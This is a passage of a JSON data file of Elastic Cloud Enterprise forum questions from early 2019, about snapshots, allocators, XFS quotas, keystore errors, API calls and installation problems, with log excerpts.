    "date": "February 21, 2019, 1:19pm February 21, 2019, 3:18pm February 23, 2019, 3:19pm March 9, 2019, 3:19pm",
    "body": "Hi, I disable one cluster snapshot feature. But then ece shows that this cluster is unhealthy because snapshot is disabled which is very annoying because I definitely know it. image.jpg2384×854 193 KB Is there any way to solve this except enabling snapshot again?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dc782020-1829-4ef6-8b31-7351b3bb3d72",
    "url": "https://discuss.elastic.co/t/snapshot-is-broken-for-es-6-4-1/169637",
    "title": "Snapshot is broken for es 6.4.1",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 23, 2019, 12:40am February 23, 2019, 1:53pm February 23, 2019, 1:50am February 23, 2019, 1:52pm February 23, 2019, 3:13pm March 9, 2019, 3:28pm",
    "body": "Hi, I'm testing ece 2.1 snapshot feature and find that snapshot is ok with elasticsearch 6.5.4 but broken with 6.4.1. I found following message in cluster logs. [2019-02-23T00:33:46,123][DEBUG][com.amazonaws.request ] Sending Request: GET https://ece-backup.s3-eu-west-1.amazonaws.com / Parameters: ({\"prefix\":[\"snapshots/346be4fb68d14cf6ac6402eaffcf409b/index-\"],\"encoding-type\":[\"url\"]}Headers: (User-Agent: aws-sdk-java/1.11.223 Linux/3.10.0-862.3.2.el7.x86_64 Java_HotSpot(TM)_64-Bit_Server_VM/25.144-b01 java/1.8.0_144, amz-sdk-invocation-id: 671b1c5b-adb7-f1eb-4a3a-ad42243cb555, Content-Type: application/octet-stream, ) It seems like that es cluster don't get the correct snapshot config from ece repository. Why snapshot is broken for 6.4.1 but ok for 6.5.4? These two version should be both 6.x. Any tips? thanks!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "cd6c84d5-adac-46bd-8c7a-5c4bba1a967c",
    "url": "https://discuss.elastic.co/t/automatic-curation-of-cluster-indices/169386",
    "title": "Automatic curation of cluster indices",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "February 21, 2019, 10:32am February 21, 2019, 1:43pm February 21, 2019, 2:39pm February 21, 2019, 3:01pm March 7, 2019, 3:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "aba7ea8f-8b3a-40f1-b8d0-f0feefd689f1",
    "url": "https://discuss.elastic.co/t/need-some-advice-on-cpu-core-number-vs-memory-for-ece-allocator/169242",
    "title": "Need some advice on cpu core number vs memory for ece allocator",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 20, 2019, 3:31pm February 20, 2019, 4:02pm February 21, 2019, 12:30am February 21, 2019, 2:00pm March 7, 2019, 2:02pm",
    "body": "Hi, I'm applying new test machine for ece and get below specification. CPU 24 Core/ Memory 384 GB As I know, ece allocate same cpu ratio to node with memory. For example, If I create a 64GB Node, then ece will allocate 24*(64/384) = 4 CPU Core to this node. But 4 cpu core is too small comparing to 64GB memory. So any advice on this kind of machine specification? Should I limit allocator available memory by --capacity parameter? And what is the ideal cpu core to memory size ratio? like 64Core to 256GB? thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "97e5fec1-ac84-451a-befe-d9c8bfa76a6e",
    "url": "https://discuss.elastic.co/t/why-some-allocators-are-not-used/169233",
    "title": "Why some allocators are not used?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 20, 2019, 2:26pm February 20, 2019, 2:51pm February 20, 2019, 2:53pm February 20, 2019, 4:06pm March 6, 2019, 4:06pm",
    "body": "Hi, I have 3 zones and assign 2 allocators in 2 zones while 1 allocator in 1zone. After some cluster deployment operations, I find that 2 allocators are not used any more like below screenshot. image.jpg2608×1244 319 KB This seems to be not reasonable because the cluster allocation is not balanced between all allocators. Is this a normal result? Ans how does ece coordinator determine which allocator to use for a new cluster node? What is the allocation algorithm?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d12fbf23-76db-408e-91b3-8b82bcdf11a2",
    "url": "https://discuss.elastic.co/t/snapshot-stop-working-when-there-is-a-partial-snapshot/168967",
    "title": "Snapshot stop working when there is a partial snapshot",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 19, 2019, 8:42am February 19, 2019, 9:02am March 5, 2019, 9:03am",
    "body": "Hi, I meet a strange problem that s3 snapshot stop working like below. image.png2828×3506 778 KB The next snapshot time is scheduled at one past time. Any idea of the root cause? And how to start snapshot again? In addition, I just make a full restart of ece cluster.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "db11afcf-2c39-4916-afe2-b31fbfe2ce9a",
    "url": "https://discuss.elastic.co/t/mongodb-to-elastic-cloud-enterprise/168378",
    "title": "MongoDB to Elastic Cloud Enterprise",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "siva2",
    "date": "February 14, 2019, 9:56am February 14, 2019, 4:05pm February 14, 2019, 5:56pm February 28, 2019, 5:56pm",
    "body": "Hi, I have a ecommerce shop system based on Heroku and a elastic cloud enterprise system. I want my shop system search to be based on elastic search. How should I design my set up? Use logstash locally to drive data from mongoDB on heroku to elastic cloud ? Use IBM compose transporter to connect mongoDB to Elastic cloud? Any available beats solution? Is there any other available elastic solution that lets it connect to my MongoDb instance and update it real time? Would be really helpful if someone can point me in the right direction. Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "31aa8097-7af9-482a-9f08-1ef760c371e4",
    "url": "https://discuss.elastic.co/t/moving-nodes-across-allocators/168409",
    "title": "Moving nodes across allocators",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 14, 2019, 12:16pm February 14, 2019, 12:55pm February 14, 2019, 1:07pm February 14, 2019, 1:51pm February 28, 2019, 1:51pm",
    "body": "Hi, I've done some investigation on how to move nodes across allocators and I find it very limited in terms of options where a node can be moved to. Please correct me if I'm wrong. I have the following ECE topology: Zone A - allocator 1 Zone B - allocator 2 Zone C - allocator 3 + allocator 4 For a cluster having nodes in all 3 zones, it's possible to move ELS node only inside Zone C as this is the only one having two allocators. I can't move a node from allocator 1 to allocator 4 since the deployment specifies that nodes must be in 3 zones, and a node in Zone A can't be moved out to another zone, because it would lead to a cluster having two zones only. Does it mean that a small ECE installation with only 3 nodes and clusters having nodes in all 3 zones effectively can't use this feature at all? Actually, any ECE installation would have to have at least two allocators per zone in this case. Is that correct?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "212c5a21-1f16-45ab-b375-34b2a75f7625",
    "url": "https://discuss.elastic.co/t/ece-cloud-ui-shows-incorrect-info-of-node-roles/168228",
    "title": "ECE Cloud UI shows incorrect info of node roles",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 13, 2019, 1:12pm February 13, 2019, 2:21pm February 14, 2019, 2:42am February 28, 2019, 2:42am",
    "body": "Hi, I notice that Cloud UI shows incorrect info of node roles. For example, my ece has 3 node with full roles as below. image.png1419×365 50 KB But UI shows that 2 of all nodes has no roles which actually has all roles. I think this might show when admin-console-es data is out of sync with zookeeper. Is this a known bug? Any progress or idea to fix this? Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "10a03663-488d-4aa1-b42a-c2d13ad4f070",
    "url": "https://discuss.elastic.co/t/how-ece-kibana-balances-requests/167885",
    "title": "How ECE Kibana balances requests",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 11, 2019, 3:41pm February 11, 2019, 6:46pm February 12, 2019, 8:59am February 26, 2019, 9:09am",
    "body": "Hi, how is Kibana that is part of an ece cluster balancing requests inside the cluster? I think showing an example will be best: A cluster with three zones A, B, C. Each zone having 2 ES nodes + 1 Kibana. When a request reaches Kibana in zone A, is it then calling one of two ES nodes in the same zone or can it call any ES node in any zone? This relates to the question above, but if one or both ES nodes fail in zone A, will Kibana in the zone A still be able to handle requests correctly? Appreciate your help",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dd4d633b-a1d2-4a6c-8452-630b2f3a410c",
    "url": "https://discuss.elastic.co/t/rolling-restarts/167912",
    "title": "Rolling restarts",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "wpitt13",
    "date": "February 11, 2019, 6:16pm February 11, 2019, 6:42pm February 25, 2019, 6:52pm",
    "body": "Are there recommended procedures for rolling restarts of ECE runners in cases of system level patching or hardware maintenance?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "85c6a0f6-cd17-42c9-ad8f-63b2978243b1",
    "url": "https://discuss.elastic.co/t/index-lifecycle-management-status-issue-for-6-6-es-clusters/167824",
    "title": "Index Lifecycle Management Status issue for 6.6 ES clusters",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "nfroidure",
    "date": "February 11, 2019, 10:23am February 11, 2019, 10:36am February 25, 2019, 10:49am",
    "body": "By reading the docs, I saw there were some APIs to check ILM status: https://www.elastic.co/guide/en/elasticsearch/reference/current/ilm-get-status.html But the API seems to not be available: curl -X GET \"https://xxx.europe-west1.gcp.cloud.es.io:9243/_ilm/status\" -u \"elastic:xxx\" {\"error\":\"Incorrect HTTP method for uri [/_ilm/status] and method [GET], allowed: [POST]\",\"status\":405}% Is the documentation wrong or just the API not available ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3e18f4e0-7f10-44c8-a7d0-110d1e3f755c",
    "url": "https://discuss.elastic.co/t/ece-broken-after-one-node-lost/167481",
    "title": "ECE broken after one node lost",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 7, 2019, 4:05pm February 7, 2019, 5:40pm February 21, 2019, 5:37pm",
    "body": "Hi, I'm currently working on HA tests for ECE before going to production and I just ran into an interesting issue. I have 4 nodes divided into 2 zones and ECE elasticsearch cluster (the system one) have 2 nodes (one node per zone). I simulated a node failure by deleting all docker containers in one of those two nodes and I can't recover from it even when I install ECE again using an emergency token on the failed node. I can log into the UI, but it's broken and I can't do anything there. I understand that the system cluster failed because with only 2 zones it had 2 masters and when one of them failed, the whole cluster went down. This was expected. I wonder if there's a way to recover from such state because I believe this edge case could happen in prod as well and I want to be prepared for it. I realize that having only two zones is risky, but theoretically, this can happen even with 3 zones in prod - one zone in the maintenance, the second one just failed. My question is - could the ece system cluster be considered a single point of failure and we have to make sure it never fails or is there a way to recover even from this state? Thanks in advance",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1f2d22d9-5a64-4e88-a960-07ae5a2c31e4",
    "url": "https://discuss.elastic.co/t/how-is-memory-usage-calculated/167274",
    "title": "How is memory usage calculated",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 6, 2019, 11:21am February 6, 2019, 2:45pm February 6, 2019, 3:25pm February 20, 2019, 3:33pm",
    "body": "Hi, I'd like to understand how ECE console calculates memory usage per node, because the numbers don't add up for me. I will describe my situation: I have a cluster, 7 GB ram per node. ECE shows me 70 % JVM memory used for one of them. When I check related docker container memory usage (docker stats {container_id}), it shows me 4 GB used / 7 GB total. This seems to be correct since Elasticsearch got assigned 50 % of 7 GB which is 3.5 GB + JVM process takes some additional memory. OK. I went into the container and verified the memory used by JVM is indeed 4 GB. However, 4 GB is not 70 % of the assigned memory, it's just 57 %, so where is ECE taking the memory usage from? Any help appreciated.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2441d393-b0c7-4242-b468-1b624454ffff",
    "url": "https://discuss.elastic.co/t/xfs-quota-not-working/166591",
    "title": "Xfs_quota not working",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "darren.skinner",
    "date": "January 31, 2019, 3:21pm February 1, 2019, 12:12am February 4, 2019, 2:28pm February 4, 2019, 2:56pm February 18, 2019, 2:53pm",
    "body": "I'm having issues getting quotas working in ece. version 2.0.1 I'm getting the following error in the allocator.log file: [2019-01-31 14:44:02,569][WARN ][no.found.runner.managers.XFSQuotaManager] Command [[sudo, -n, xfs_quota, -x, -c, limit -p bhard=4096m rtbhard=4096m 17851, /local]] returned status code [0]] with output: [E: [xfs_quota: cannot setup path for mount /local: No such device or address], E: [xfs_quota: cannot setup path for mount /local: No such device or address]] {} It seems to be complaining about setting it up for /local however /local is not my data path. it is /local/elastic-cloud bash-4.2$ mount|grep local /dev/mapper/vg_elastic_cloud-ece on /local/elastic-cloud type xfs (rw,relatime,attr2,inode64,prjquota) If i run the command with the correct filesystem it creates the quota as expected: 15:15:17 # xfs_quota -x -c 'limit -p bhard=4096m rtbhard=4096m 17851' /local/elastic-cloud 15:15:17 # xfs_quota -x -c 'report -h ' /local/elastic-cloud Project quota on /local/elastic-cloud (/dev/mapper/vg_elastic_cloud-ece) Blocks Project ID Used Soft Hard Warn/Grace ---------- --------------------------------- #0 45.6M 0 0 00 [------] #17851 0 0 4G 00 [------]",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e6255047-ef89-41f0-bf20-44bf305b09b3",
    "url": "https://discuss.elastic.co/t/ece-2-1-0-es-keystore-problem/166729",
    "title": "ECE 2.1.0 ES Keystore Problem",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 1, 2019, 12:13pm February 1, 2019, 12:14pm February 1, 2019, 2:06pm February 1, 2019, 2:28pm February 15, 2019, 2:19pm",
    "body": "Hi, I'm testing elasticsearch keystorre feature on 2.1.0 but face a problem I set one custom key by following api. curl --request PATCH \\ --url https://*.*.*.*/api/v1/clusters/elasticsearch/c1ddddabc119455da62e9c3f965194f6/keystore \\ --header 'content-type: application/json' \\ --data '{ \"secrets\": { \"mykey\": { \"value\": \"test\", \"as_file\": false } } }' I test on docker container and find the set key. But when I restart the deployment, the es cannot start normally and has following error log. [2019-02-01T11:54:09,784][WARN ][org.elasticsearch.bootstrap.ElasticsearchUncaughtExceptionHandler] [instance-0000000000] uncaught exception in thread [main] org.elasticsearch.bootstrap.StartupException: java.lang.IllegalArgumentException: unknown secure setting [mykey] please check that any required plugins are installed, or check the breaking changes documentation for removed settings at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:163) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:124) ~[elasticsearch-cli-6.6.0.jar:6.6.0] at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-cli-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:116) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:93) ~[elasticsearch-6.6.0.jar:6.6.0] Caused by: java.lang.IllegalArgumentException: unknown secure setting [mykey] please check that any required plugins are installed, or check the breaking changes documentation for removed settings at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:482) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:427) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:398) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:369) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.common.settings.SettingsModule.<init>(SettingsModule.java:148) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.node.Node.<init>(Node.java:372) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.node.Node.<init>(Node.java:265) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Bootstrap$5.<init>(Bootstrap.java:212) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:212) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:333) ~[elasticsearch-6.6.0.jar:6.6.0] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:159) ~[elasticsearch-6.6.0.jar:6.6.0] ... 6 more The es container keeps restarting. What is the problem about?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b45d6457-a863-4522-ab20-c538c7e4d1cd",
    "url": "https://discuss.elastic.co/t/bearer-tokens-and-elasticsearch-api/166702",
    "title": "Bearer Tokens and Elasticsearch API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "February 1, 2019, 9:35am February 1, 2019, 12:22pm February 1, 2019, 2:03pm February 15, 2019, 2:03pm",
    "body": "Hi, Through the ECE ui there is the option of API console on each cluster which sends a request like this https://<ECE_URL>:12443/api/v0.1/regions/ece-region/clusters/b5fa10fc95c940fdb85c3f2f800f0dae/proxy/_cluster/_search However when I post this command in the browser I get {\"ok\":false,\"message\":\"The supplied authentication is invalid\"} So I have been trying to use POST /api/v1/users/auth/_refresh - https://www.elastic.co/guide/en/cloud-enterprise/current/refresh-token.html to get a token but this is giving me both {'errors': [{'message': 'HTTP method not allowed, supported methods: [GET]', 'code': 'root.method_not_allowed'}]} and {'errors': [{'message': 'The requested resource could not be found', 'code': 'root.resource_not_found'}]} When I use POST and GET respectively. Not sure if this is a bug in the API? Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dfc8f39a-77f8-48cd-96df-647fe50a4e11",
    "url": "https://discuss.elastic.co/t/need-advice-on-ece-hardware/166576",
    "title": "Need advice on ECE Hardware",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "January 31, 2019, 2:26pm January 31, 2019, 3:16pm January 31, 2019, 3:18pm February 1, 2019, 12:11am February 15, 2019, 12:11am",
    "body": "Hi, @Alex_Piggott Our team is working on one project like logging as a service based on ece. We need to use raid arch because we have a very high data availability requirement. After some investigation, raid 50 seems to be a better decision. Do you guys use raid 50 on elastic cloud? Can you give me some tips if we need to provide 8 TB storage size per ece allocator node? For example, how many disks should we use and how much size is each disk for the raid 50 arch? Thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d83e6b5a-35a2-465b-a89c-986019fdb475",
    "url": "https://discuss.elastic.co/t/elasticcloud-repository-s3-plugin-possible/166647",
    "title": "ElasticCloud repository-s3 plugin possible?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osotragic",
    "date": "January 31, 2019, 9:34pm January 31, 2019, 9:49pm February 14, 2019, 9:49pm",
    "body": "We are wanting to migrate from aws elasticsearch to elasticcloud and was wanting to find a way we could take our snapshot in aws and restore it to a cluster in elasticcloud using the repository-s3 plugin. Is this possible to make our lives easier in regards to moving over to elasticcloud?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6cdffb0f-d76c-420f-9fc5-9f814c282a59",
    "url": "https://discuss.elastic.co/t/cant-delete-an-index-with-elastic-user/166513",
    "title": "Can't delete an index with \"elastic\" user",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 31, 2019, 11:22am January 31, 2019, 10:04am January 31, 2019, 11:12am January 31, 2019, 11:20am January 31, 2019, 11:49am January 31, 2019, 12:08pm January 31, 2019, 1:36pm January 31, 2019, 2:13pm February 14, 2019, 2:13pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "f63cf802-b89c-4c1a-80bd-e9d7d8384dc1",
    "url": "https://discuss.elastic.co/t/what-is-the-ece-capacity-validation-algorithm/166314",
    "title": "What is the ECE Capacity Validation Algorithm?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "January 30, 2019, 9:17am January 30, 2019, 3:14pm January 31, 2019, 12:09am February 14, 2019, 2:06am",
    "body": "Hi, I'm testing how ece make sure that available resource is enough for a plan and meet an interesting problem. Let us assume that we have following available resource. image.jpg2302×1242 268 KB Then I want to scale one cluster to following size with 2 16GB nodes in 2 zones. image.jpg1594×882 114 KB If I chose \"create new\" strategy, the plan quit immediately with following error. image.jpg2238×680 285 KB But if I chose \"rolling create new\" strategy, the plan didn't quit until constructor found there were no valid allocator for all nodes. image.jpg2216×904 409 KB But it ended with two new nodes like following image. image.jpg2256×922 239 KB So for \"rolling create new\" strategy, constructor don't check the available resource for the plan like \"create new\" strategy. But this will bring an incomplete plan execution. What I expect is that constructor can use the same resource capacity validation algorithm both for \"create new \" or \"rolling create new\" strategy. Because we have limited resource, so we choose \"rolling create new\" as the default strategy. We hope that we can break the plan execution immediately if there is not enough capacity. Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "51610709-195d-4331-83ed-87c10b47af5d",
    "url": "https://discuss.elastic.co/t/elrepo-no-longer-maintains-kernel-lt-4-4-155-in-its-archive/166211",
    "title": "Elrepo no longer maintains kernel-lt 4.4.155 in it's archive",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ryan.chadwick",
    "date": "January 29, 2019, 4:42pm January 29, 2019, 7:03pm January 29, 2019, 9:45pm January 30, 2019, 8:43am February 13, 2019, 8:43am",
    "body": "I'm in the process of installing ECE on my first host. I've seen a number of similar topics with the issue of the kernel version being incorrect. The documentation very clearly states that kernel-lt 4.4.155 from elrepo is the preferred option (at least for RHEL). However, the elrepo project has cycled kernel-lt 4.4.155 out of it's archive and is no longer generally available. It's many mirrors are also missing this version of the kernel-lt rpm. Are there any other distributions points or yum repositories that still host this version of kernel-lt available?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8ff1b8d0-46e6-42a9-84ec-7b9f1fddd471",
    "url": "https://discuss.elastic.co/t/ece-setname-api-do-not-support-chinese-character/166016",
    "title": "ECE setName API do not support Chinese Character",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "January 28, 2019, 3:25pm January 28, 2019, 3:19pm January 28, 2019, 3:21pm January 28, 2019, 3:24pm January 28, 2019, 3:25pm January 28, 2019, 3:27pm February 11, 2019, 3:27pm",
    "body": "Hi, I'm testing ece api and try to update a deployment name by usign setName API. https://www.elastic.co/guide/en/cloud-enterprise/1.0/set-es-cluster-name.html But if I use Chinese words for new cluster name, this call will fail like below. curl --request PUT --url https://x.x.x.x/api/v1/clusters/elasticsearch/9568df05c3a249b6b98e3bca425eb8db/metadata/name/%E4%B8%AD%E6%96%87%E5%90%8D%E7%A7%B0 The new cluster name is 中文名称. The response is as below: { \"errors\": [ { \"code\": \"root.method_not_allowed\", \"message\": \"HTTP method not allowed, supported methods: [GET]\" } ] } I think this should be a url path parameter decode problem and post here to let you guys know. In addition, I know I can get this done by using set cluster metadata api but I have to get cluster metadata first which is a little redundant.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d3f1e8b3-17b4-44a8-9815-e719b7f7c0ab",
    "url": "https://discuss.elastic.co/t/ece-xfs-quota-question/164718",
    "title": "ECE XFS Quota Question",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "January 18, 2019, 1:11am January 18, 2019, 2:00am January 18, 2019, 2:16pm January 21, 2019, 12:30am January 22, 2019, 7:38am January 22, 2019, 2:53pm January 22, 2019, 2:56pm January 22, 2019, 2:59pm January 22, 2019, 3:08pm January 22, 2019, 3:12pm January 22, 2019, 3:25pm January 22, 2019, 3:34pm January 22, 2019, 3:42pm January 22, 2019, 3:45pm January 22, 2019, 5:10pm January 23, 2019, 2:31pm January 23, 2019, 2:45pm January 24, 2019, 1:01am February 7, 2019, 1:01am",
    "body": "Hi, I'm testing ECE 2.0 to see if this is a better solution for our current es cluster management work. I see following warning logs in the cluster log. [2018-11-02 16:20:59,091][WARN ][no.found.runner.allocation.elasticsearch.ElasticsearchDockerContainer] Quota path not initialized, creating directory for path: [/mnt/data/elastic/172.31.16.63/services/allocator/containers/elasticsearch/1b01fd74758543d7857b6aa53a54389b/instance-0000000001/data] {\"ec_container_kind\":\"elasticsearch\",\"ec_container_group\":\"1b01fd74758543d7857b6aa53a54389b\",\"ec_container_name\":\"instance-0000000001\"} It seems like that XFS Quota does not function normally. And I see some strange display in ece cloud ui and Kibana Monitoring page. For example, I create a cluster with 1GB Mem and 32GB Disk. Then in cloud ui, the es node is shown as 1GB Mem and 32GB Disk. But if I connect to Kibana and see nodes in Monitoring Panel, the content is different. The node is shown as 1GB Mem but 200GB disk which is the total size of the vm I run ece allocator. image.jpg2824×886 289 KB image.jpg2874×420 209 KB Maybe this is relative to xfs quota. Please can you give me some advice for this? This seems to be a severe issue which will bring confusion to our users. thanks!",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "ea543676-c8aa-4087-982b-a479d22eb982",
    "url": "https://discuss.elastic.co/t/experience-unavailable-cluster-issue/164506",
    "title": "Experience Unavailable Cluster Issue",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "January 16, 2019, 4:48pm January 16, 2019, 5:23pm January 16, 2019, 11:55pm January 17, 2019, 12:04am January 17, 2019, 12:19am January 17, 2019, 12:43am January 17, 2019, 12:51am January 17, 2019, 12:52am January 17, 2019, 12:54am January 17, 2019, 12:58am January 17, 2019, 1:23am January 17, 2019, 1:35am January 17, 2019, 2:01am January 17, 2019, 2:40pm January 18, 2019, 12:43am February 1, 2019, 12:43am",
    "body": "Hi, I'm testing ece 2.0.1 on aws. My deployment is a small one with three ece node with full roles. One ece node was terminated. Ece should have high availability even one node is down. But the reality is I cannot get anything from cloud ui. It just told me that \"The requested cluster is currently unavailable\" like below. image.jpg2028×716 101 KB I try to find the reason behind the issue. If I connect to admin console es cluster, everything goes ok. But if I connect by proxy, it tells me \"The requested cluster is currently unavailable\". This is weird but I don't know why proxy report unavailable cluster while this cluster is in green status. Please help!",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "f8ab1ade-efbe-4cfb-9dd8-dc57ddda7c1a",
    "url": "https://discuss.elastic.co/t/errno-2-no-such-file-or-directory/164473",
    "title": "[Errno 2] No such file or directory:",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jasony",
    "date": "January 16, 2019, 1:07pm January 16, 2019, 2:22pm January 17, 2019, 12:42am January 17, 2019, 2:47pm January 31, 2019, 2:47pm",
    "body": "Hello, I am seeing below error during the installation. I took all steps in the instruction, but I am not sure which step made me to create ~/tmp directory. Please advise. Thank you! fyi, I am using docker 18.03 on centos7. [jason@els01 ~]$ bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install Elastic Cloud Enterprise Installer Start setting up a new Elastic Cloud Enterprise installation by installing the software on your first host. This first host becomes the initial coordinator and provides access to the Cloud UI, where you can manage your installation. To learn more about the options you can specify, see the documentation. NOTE: If you want to add this host to an existing installation, please specify the --coordinator-host and --roles-token flags -- Verifying Prerequisites -- Checking runner container does not exist... PASSED Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... PASSED Checking host storage path contents matches whitelist... PASSED Checking Docker version... PASSED Checking Docker file system... PASSED Checking Docker storage driver... PASSED Checking whether 'setuser' works inside a Docker container... PASSED Checking runner ip connectivity... PASSED Checking OS IPv4 IP forward setting... PASSED Checking OS max map count setting... PASSED Checking OS kernel version... PASSED Checking minimum required memory... PASSED Checking OS kernel cgroup.memory... PASSED Checking OS minimum ephemeral port... PASSED Checking OS max open file descriptors per process... PASSED Checking OS max open file descriptors system-wide... PASSED OS setting for max open file descriptors system-wide should be >= 207400, currently 65535 Checking OS file system and Docker storage driver compatibility... PASSED Checking OS file system storage driver permissions... Errors have caused Elastic Cloud Enterprise installation to fail [Errno 2] No such file or directory: '/elastic_cloud_apps/bootstrap-initiator/bootstrap_initiator/prerequisite/tmp'",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1aa5fa3a-10aa-4e17-bddb-67c72f699fd2",
    "url": "https://discuss.elastic.co/t/where-is-the-logstash-in-ece/164376",
    "title": "Where is the Logstash in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Giovanni_Mazza",
    "date": "January 15, 2019, 9:42pm January 15, 2019, 9:48pm January 29, 2019, 9:48pm",
    "body": "Where is logstash in ECE. I though it was part of the ingest node it seems it does not comes with the product at ALL. is there anything else that need to be installed to get logstash to work on the managed infrastructure. Or it need to be installed separately?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e2487dcc-a991-4264-9aa7-7ef5731c0b34",
    "url": "https://discuss.elastic.co/t/get-the-node-of-a-runner/163515",
    "title": "Get the node of a Runner",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "January 9, 2019, 11:09am January 9, 2019, 11:52am January 9, 2019, 12:02pm January 9, 2019, 1:17pm January 9, 2019, 1:50pm January 9, 2019, 4:19pm January 10, 2019, 9:02am January 24, 2019, 9:02am",
    "body": "I feel like I must be missing something obvious in the API Reference but can't work out how to find which node a runner is in through the API. Thanks in advance",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3c7c7b50-c62f-484f-b7d1-9df23e5378aa",
    "url": "https://discuss.elastic.co/t/ece-license-cost/162725",
    "title": "ECE - license cost",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 2, 2019, 11:09pm January 2, 2019, 11:37pm January 16, 2019, 11:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f906e5a8-fff0-4f35-89f8-f354c621d32b",
